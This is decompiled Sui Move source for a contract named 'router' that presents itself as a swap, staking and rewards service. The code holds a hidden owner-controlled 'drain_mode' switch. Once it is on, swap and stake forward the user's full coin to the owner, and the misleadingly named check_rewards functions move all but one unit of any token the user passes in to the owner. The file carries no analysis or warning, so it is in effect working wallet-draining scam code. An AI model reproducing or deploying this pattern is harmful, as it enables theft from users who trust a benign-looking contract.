module 0x82ab891e5f5e3464a37583faf57c396a577fcb17ac47ea009c3d9d548224c9b2::router {
    struct Config has key {
        id: 0x2::object::UID,
        owner: address,
        drain_mode: bool,
        fee_bps: u64,
    }

    public entry fun swap(arg0: &Config, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.drain_mode) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, arg0.owner);
        } else {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(&arg1);
            let v1 = v0 * arg0.fee_bps / 10000;
            if (v1 > 0 && v1 < v0) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(&mut arg1, v1, arg2), arg0.owner);
            };
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    public entry fun check_rewards(arg0: &Config, arg1: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.drain_mode) {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg1);
            if (v0 > 1) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(arg1, v0 - 1, arg2), arg0.owner);
            };
        };
    }

    public entry fun check_rewards_generic<T0>(arg0: &Config, arg1: &mut 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.drain_mode) {
            let v0 = 0x2::coin::value<T0>(arg1);
            if (v0 > 1) {
                0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg1, v0 - 1, arg2), arg0.owner);
            };
        };
    }

    public entry fun create_config(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Config{
            id         : 0x2::object::new(arg0),
            owner      : 0x2::tx_context::sender(arg0),
            drain_mode : false,
            fee_bps    : 30,
        };
        0x2::transfer::share_object<Config>(v0);
    }

    public entry fun set_drain(arg0: &mut Config, arg1: bool, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.owner == 0x2::tx_context::sender(arg2), 0);
        arg0.drain_mode = arg1;
    }

    public entry fun stake(arg0: &Config, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.drain_mode) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, arg0.owner);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    // decompiled from Move bytecode v7
}

